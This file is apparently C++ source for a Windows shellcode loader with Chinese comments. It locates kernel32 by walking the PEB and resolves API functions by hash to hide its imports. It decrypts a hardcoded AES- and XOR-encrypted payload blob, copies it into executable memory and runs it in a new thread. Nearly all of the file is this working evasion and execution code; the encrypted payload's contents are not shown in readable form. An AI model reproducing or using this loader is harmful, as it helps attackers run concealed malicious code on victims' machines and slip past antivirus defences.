#include <iostream>
#include "AES.h"
#include "Base64.h"
#include <Windows.h>
#include <vector>
#include <iomanip>
#include <sstream>
using namespace std;
#pragma warning(disable:4996)

using namespace std;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI* fnGetModuleHandleA)(
    LPCSTR lpModuleName
    );

typedef FARPROC(WINAPI* fnGetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef PVOID(WINAPI* fnVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef PVOID(WINAPI* fnCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
    );

typedef PVOID(WINAPI* fnWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds
    );

DWORD calcMyHash(char* data) {
    DWORD hash = 0x35;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcMyHash((char*)CharLowerA(name));
}

//从内存中获取Kernel32.dll的基地址
static HMODULE getKernel32(DWORD myHash) {
    HMODULE kernel32;

    // 获取PEB结构地址（在x64位系统中的偏移量，32位不同）
    INT_PTR peb = __readgsqword(0x60);

    auto modList = 0x18; // PEB_LDR_DATA结构中模块列表偏移量
    auto modListFlink = 0x18; // LDR_DATA_TABLE_ENTRY结构中下一个模块的偏移量
    auto kernelBaseAddr = 0x10; // LDR_DATA_TABLE_ENTRY结构中映像基地址的偏移量

    // 获取PEB_LDR_DATA结构中的模块列表指针
    auto mdllist = *(INT_PTR*)(peb + modList);

    // 获取第一个模块的LDR_DATA_TABLE_ENTRY结构中的下一个模块的指针
    auto mlink = *(INT_PTR*)(mdllist + modListFlink);

    // 获取kernel32.dll的基地址
    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);

    auto mdl = (LDR_MODULE*)mlink;

    // 遍历模块列表，查找kernel32.dll模块
    do {
        mdl = (LDR_MODULE*)mdl->e[0].Flink; // 获取下一个模块的LDR_MODULE结构指针
        if (mdl->base != nullptr) { // 确认模块的基地址不为空
            if (calcMyHashBase(mdl) == myHash) { // 比较模块基地址的hash值是否与目标值相同，即找到了kernel32.dll
                break;
            }
        }
    } while (mlink != (INT_PTR)mdl); // 如果遍历到的模块指针等于最开始的指针，则已遍历完整个模块列表

    kernel32 = (HMODULE)mdl->base; // 将kernel32.dll模块的基地址保存在kernel32变量中
    return kernel32;
}

//列出kernel32.dll中的api函数，计算hash与传入的目标hash对比
static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

        if (calcMyHash(pFuncName) == myHash) {
            printf("successfully found! %s - %d\n", pFuncName, myHash);
            return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
        }
    }
    return nullptr;
}

//// key for XOR decrypt
char my_secret_key[] = "sothisistest";

// decrypt deXOR function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

const char g_key[17] = "aswswetyhjuytrfd";
const char g_iv[17] = "gfdertfghjkuyrtg";

string DecryptionAES(const string& strSrc) //AES解密
{
    string strData = base64_decode(strSrc);
    size_t length = strData.length();
    //密文
    char* szDataIn = new char[length + 1];
    memcpy(szDataIn, strData.c_str(), length + 1);
    //明文
    char* szDataOut = new char[length + 1];
    memcpy(szDataOut, strData.c_str(), length + 1);

    //进行AES的CBC模式解密
    AES aes;
    aes.MakeKey(g_key, g_iv, 16, 16);
    aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

    //去PKCS7Padding填充
    if (0x00 < szDataOut[length - 1] <= 0x16)
    {
        int tmp = szDataOut[length - 1];
        for (int i = length - 1; i >= length - tmp; i--)
        {
            if (szDataOut[i] != tmp)
            {
                memset(szDataOut, 0, length);
                cout << "去填充失败！解密出错！！" << endl;
                break;
            }
            else
                szDataOut[i] = 0;
        }
    }
    string strDest(szDataOut);
    delete[] szDataIn;
    delete[] szDataOut;
    return strDest;
}

//string to int
vector<int> split_string(const string& s, char delimiter) {
    vector<int> tokens;
    stringstream ss(s);
    string token;
    while (getline(ss, token, delimiter)) {
        if (token.empty()) continue;
        tokens.push_back(stoi(token));
    }
    return tokens;
}

//int to hex
string intToHexString(int num) {
    stringstream stream;
    stream << setfill('0') << setw(2) << hex << num;
    return stream.str();
}


int main(int argc, char* argv[]){
    if (argc > 1) {
        HMODULE mod = getKernel32(56369259);
        fnGetModuleHandleA myGetModuleHandleA = (fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
        fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr(mod, 448915681);

        HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
        fnVirtualAlloc myVirtualAlloc = (fnVirtualAlloc)myGetProcAddress(hk32, "VirtualAlloc");
        fnCreateThread myCreateThread = (fnCreateThread)myGetProcAddress(hk32, "CreateThread");
        fnWaitForSingleObject myWaitForSingleObject = (fnWaitForSingleObject)myGetProcAddress(hk32, "WaitForSingleObject");
        string encodeResult = "6nkrVE4rDttnNDvq0hC1RwKJS4WoP7iYpocH02mUc4NeagnpeDAc4SuQrW4L78QOhfFe6UVyROxxBlvgvIu3ir7N0Izj5XYxH5JjdpFYgnA9nOn8PdLjaiDGiKjv1cVza64IiUk92z3LSjAte8WWb0kR8wUpABvjeGjcEw9PrF/DKm1pa2FuR3z+7iZJCxKZErK4FfD29kWy9AlInA9lRtuyCR34rynRXmRI3lshYrgfoyhSCU1KpSPiuiXW4fX3soYw4NUdh9v0VWPFEBP6oJleFkEbW9UNC2gu759V6sui/UY87AX5OvgT3Oqa1lNpTvi3DzrqWnjnZjb45QoIzkvn7znVdnslSmXP/4AHKkH/FEZUZzKTfpoxYwR4pNDbCeQwLw4xhdMUJZJvJvO7c7OzWnpeeb/H1vCEHCtA1LHuKeYRcUXHcoUzwv2Y5w+tdbqbP+SV902+JciqlH1YYUISQt/6+1IPCFitR3tBUuj0EgshIFJK3l+9dsp291LsB77VYvTRvmYId9wGSuohkDv39exrZT6Q9wCqp4alVolQVMfIyq1D9BE0K/LoINL5ERZLKfsPRn+ZJRlTWvwdbCxWvcui58rcGZ22t89E6efMjUpEKLFp/F4sWLK5SwYTN6DQyFSAG4xCplSS3674mD0sd/fRe5ATJiA46Y2rsBTed6JpapuIUmA1Fssr3lQxCbmzLIpyhwYOGYfmJoACIqXEfPIds5RF9Zojc1SIQWLMQPtiu4NyjqmU0YS/l7xFSmfLIjWufHPDGI+HGGig20HCuNm3WnpA7Alyeq6KuJGe+oprmiaGKSTXbM7eHagT4lHouJAOFOZSeFy47Av2hBOQmIA92fwY8xxaONayfsovU7+OFhcER3pXnDNobI7V/LLc4BnNBtYZ1oXlVvbJsLa4Wix9dLWxdGDEjjzIP8azVhpVXn4GQuiauiT5UCUQ2VamUEew8QJmr6ndboTsBDofLCbeU6e64WUVNJ7xqdjLtc8p1Vnj2DaYd+a+LXgdiz5TGh/9lLS1eCe8QXYMMUWTOhSt7B2IuV6A0jLTVtQi5jYkxfgKyJWlRVM1KlxNiOypKre7IN9Js+uAHAu4iHJph5ML01cju4dLdFReZZCZhSRcy3PXVX5sstVKcaKbWVoVOWQLI1Ja1c33EPQ10wpZ3zbxjINahnt3j+cjUdv/BuKMBV2f/DOYvGksIkudq8UVa+2uBBwfFxUC4TVdcrT4GHBbw13+2Gt6gUGlP+DFF4tpboO32pXRw3UnBtHp";
        string decodeResult = DecryptionAES(encodeResult);
        vector<int> nums = split_string(decodeResult, ',');
        vector<unsigned char> my_payload_temp;
        //int转hex
        for (int num : nums) {
            string hexString = intToHexString(num);
            unsigned char hexChar = static_cast<unsigned char>(stoul(hexString, nullptr, 16));
            my_payload_temp.push_back(hexChar);
        }
        //最终的unsigned char
        unsigned char* my_payload = new unsigned char[my_payload_temp.size() + 1];
        copy(my_payload_temp.begin(), my_payload_temp.end(), my_payload);
        my_payload[my_payload_temp.size()] = '\0';
        if (my_payload_temp.back() == 0x00) {
            my_payload[my_payload_temp.size()] = '\0';
        }
        for (size_t i = 0; i < my_payload_temp.size(); ++i) {
            std::cout << std::hex << (int)my_payload[i] << " ";
        }
        cout << endl;
        unsigned int my_payload_len = my_payload_temp.size();

        XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));

        PVOID lb = myVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(lb, my_payload, my_payload_len);
        HANDLE th = myCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
        myWaitForSingleObject(th, INFINITE);
    }
    else {
        return -1;
    }
}